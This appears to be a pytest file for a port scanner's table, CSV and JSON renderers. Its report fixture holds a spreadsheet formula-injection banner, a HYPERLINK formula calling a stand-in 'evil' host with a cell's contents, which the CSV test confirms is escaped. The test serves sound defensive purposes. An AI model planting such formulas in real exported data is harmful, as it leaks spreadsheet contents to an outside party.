"""Tests for the table, CSV and JSON renderers. Reports are built by hand."""

import csv
import json

import pytest

from portscanner.output import format_table, to_json_dict, write_csv, write_json
from portscanner.scanner import CLOSED, FILTERED, OPEN, PortResult, ScanReport


@pytest.fixture
def report():
    return ScanReport(
        target="example.test",
        ip="192.0.2.10",
        started_at="2026-01-01T00:00:00+00:00",
        elapsed=1.234,
        results=[
            PortResult(22, OPEN, "ssh", "banner", "SSH-2.0-OpenSSH_9.6"),
            PortResult(23, CLOSED),
            PortResult(80, OPEN, "http", "port", ""),
            PortResult(81, FILTERED),
            PortResult(9999, OPEN, "unknown", "port", '=HYPERLINK("http://evil/?"&A1,"x")'),
        ],
    )


# --- table -------------------------------------------------------------------

def test_table_lists_only_open_ports_aligned(report):
    text = format_table(report)
    assert "Scan report for example.test (192.0.2.10)" in text
    assert "22/tcp" in text and "80/tcp" in text and "23/tcp" not in text
    # Every table row has the same width (columns sized to the data).
    rows = [line for line in text.splitlines() if line.startswith(("|", "+"))]
    assert len({len(line) for line in rows}) == 1
    assert "3 open, 1 closed, 1 filtered" in text


def test_table_marks_port_guesses_with_question_mark(report):
    text = format_table(report)
    assert "http?" in text and "ssh?" not in text


def test_table_no_open_ports():
    empty = ScanReport("h", "192.0.2.1", [PortResult(1, CLOSED)])
    assert "No open ports found." in format_table(empty)


def test_table_flags_interrupted_scans(report):
    report.interrupted = True
    assert "interrupted, partial results" in format_table(report)


# --- CSV -------------------------------------------------------------------------

def test_csv_one_row_per_open_port(report, tmp_path):
    path = tmp_path / "out" / "scan.csv"  # parent folder is created
    assert write_csv([report], path) == 3
    rows = list(csv.DictReader(path.open(encoding="utf-8")))
    assert [r["port"] for r in rows] == ["22", "80", "9999"]
    assert rows[0]["banner"] == "SSH-2.0-OpenSSH_9.6"


def test_csv_defuses_formula_injection(report, tmp_path):
    path = tmp_path / "scan.csv"
    write_csv([report], path)
    rows = list(csv.DictReader(path.open(encoding="utf-8")))
    # The leading quote makes spreadsheets show the text instead of running it.
    assert rows[2]["banner"].startswith("'=HYPERLINK")


# --- JSON ----------------------------------------------------------------------

def test_json_structure(report):
    doc = to_json_dict([report], {"threads": 5})
    assert doc["scanner"] == "portscanner" and doc["settings"] == {"threads": 5}
    (host,) = doc["hosts"]
    assert host["summary"] == {"open": 3, "closed": 1, "filtered": 1}
    assert host["ports_scanned"] == 5 and host["interrupted"] is False
    assert [p["port"] for p in host["open_ports"]] == [22, 80, 9999]


def test_json_keeps_raw_banner(report):
    # Formula escaping is a CSV/spreadsheet concern; JSON keeps the real data.
    banner = to_json_dict([report])["hosts"][0]["open_ports"][2]["banner"]
    assert banner.startswith("=HYPERLINK")


def test_json_file_round_trip(report, tmp_path):
    path = tmp_path / "scan.json"
    write_json([report], path)
    assert json.loads(path.read_text(encoding="utf-8"))["hosts"][0]["ip"] == "192.0.2.10"
